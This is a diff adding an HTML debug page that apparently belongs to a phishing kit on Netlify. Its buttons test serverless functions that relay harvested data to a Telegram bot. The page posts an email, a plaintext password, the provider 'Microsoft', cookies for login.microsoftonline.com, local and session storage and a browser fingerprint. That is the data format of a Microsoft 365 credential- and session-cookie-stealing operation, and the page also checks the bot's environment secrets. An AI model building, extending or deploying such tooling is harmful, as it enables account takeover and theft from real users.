@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debug Telegram Integration</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
+        button { background: #0078d4; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin: 10px; cursor: pointer; }
+        button:hover { background: #106ebe; }
+        .result { background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 5px; white-space: pre-wrap; }
+        .error { background: #ffebee; border-left: 4px solid #f44336; }
+        .success { background: #e8f5e8; border-left: 4px solid #4caf50; }
+        input, textarea { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h1>🔍 Telegram Integration Debug</h1>
+    
+    <div>
+        <h3>1. Test Function Availability</h3>
+        <button onclick="testFunctions()">Test Functions</button>
+        <div id="functionResult" class="result"></div>
+    </div>
+
+    <div>
+        <h3>2. Test Telegram Bot</h3>
+        <button onclick="testBot()">Test Bot Connection</button>
+        <div id="botResult" class="result"></div>
+    </div>
+
+    <div>
+        <h3>3. Send Test Data to Telegram</h3>
+        <div>
+            <label>Email:</label>
+            <input type="email" id="testEmail" value="debug@test.com">
+            
+            <label>Password:</label>
+            <input type="text" id="testPassword" value="debug123">
+            
+            <label>Provider:</label>
+            <input type="text" id="testProvider" value="Microsoft">
+        </div>
+        <button onclick="sendTestData()">Send to Telegram</button>
+        <div id="sendResult" class="result"></div>
+    </div>
+
+    <div>
+        <h3>4. Check Environment Variables</h3>
+        <button onclick="checkEnv()">Check Environment</button>
+        <div id="envResult" class="result"></div>
+    </div>
+
+    <script>
+        async function testFunctions() {
+            const result = document.getElementById('functionResult');
+            result.textContent = 'Testing functions...';
+            
+            try {
+                const testResponse = await fetch('/.netlify/functions/testTelegram');
+                const testData = await testResponse.json();
+                
+                result.className = 'result success';
+                result.textContent = `✅ Functions working!\n\n${JSON.stringify(testData, null, 2)}`;
+            } catch (error) {
+                result.className = 'result error';
+                result.textContent = `❌ Function test failed:\n${error.message}`;
+            }
+        }
+
+        async function testBot() {
+            const result = document.getElementById('botResult');
+            result.textContent = 'Testing bot connection...';
+            
+            try {
+                // This will test the bot through our function
+                const response = await fetch('/.netlify/functions/testTelegram');
+                const data = await response.json();
+                
+                if (data.success) {
+                    result.className = 'result success';
+                    result.textContent = `✅ Bot connection successful!\nBot: ${data.botInfo?.first_name} (@${data.botInfo?.username})`;
+                } else {
+                    result.className = 'result error';
+                    result.textContent = `❌ Bot test failed:\n${JSON.stringify(data, null, 2)}`;
+                }
+            } catch (error) {
+                result.className = 'result error';
+                result.textContent = `❌ Bot test failed:\n${error.message}`;
+            }
+        }
+
+        async function sendTestData() {
+            const result = document.getElementById('sendResult');
+            result.textContent = 'Sending test data...';
+            
+            const email = document.getElementById('testEmail').value;
+            const password = document.getElementById('testPassword').value;
+            const provider = document.getElementById('testProvider').value;
+            
+            try {
+                const response = await fetch('/.netlify/functions/sendTelegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        provider: provider,
+                        fileName: 'Debug Test',
+                        timestamp: new Date().toISOString(),
+                        sessionId: 'debug_' + Math.random().toString(36).substring(2, 15),
+                        userAgent: navigator.userAgent,
+                        formattedCookies: [
+                            {
+                                name: 'DEBUG_COOKIE',
+                                value: 'test_value_123',
+                                domain: '.login.microsoftonline.com',
+                                path: '/',
+                                secure: true
+                            }
+                        ],
+                        browserFingerprint: {
+                            localStorage: '{"debug":"test"}',
+                            sessionStorage: '{"debug_session":"test"}',
+                            userAgent: navigator.userAgent
+                        },
+                        documentCookies: 'DEBUG_COOKIE=test_value_123'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    result.className = 'result success';
+                    result.textContent = `✅ Data sent successfully!\n\nResponse:\n${JSON.stringify(data, null, 2)}`;
+                } else {
+                    result.className = 'result error';
+                    result.textContent = `❌ Send failed:\nStatus: ${response.status}\nResponse:\n${JSON.stringify(data, null, 2)}`;
+                }
+            } catch (error) {
+                result.className = 'result error';
+                result.textContent = `❌ Send failed:\n${error.message}`;
+            }
+        }
+
+        async function checkEnv() {
+            const result = document.getElementById('envResult');
+            result.textContent = 'Checking environment...';
+            
+            try {
+                // Try to call a function that will reveal env status
+                const response = await fetch('/.netlify/functions/testTelegram');
+                const data = await response.json();
+                
+                result.className = 'result success';
+                result.textContent = `Environment check:\n${JSON.stringify(data.envTest || data, null, 2)}`;
+            } catch (error) {
+                result.className = 'result error';
+                result.textContent = `❌ Environment check failed:\n${error.message}`;
+            }
+        }
+
+        // Auto-run basic test on page load
+        window.onload = () => {
+            console.log('🔍 Debug page loaded');
+            testFunctions();
+        };
+    </script>
+</body>
+</html>
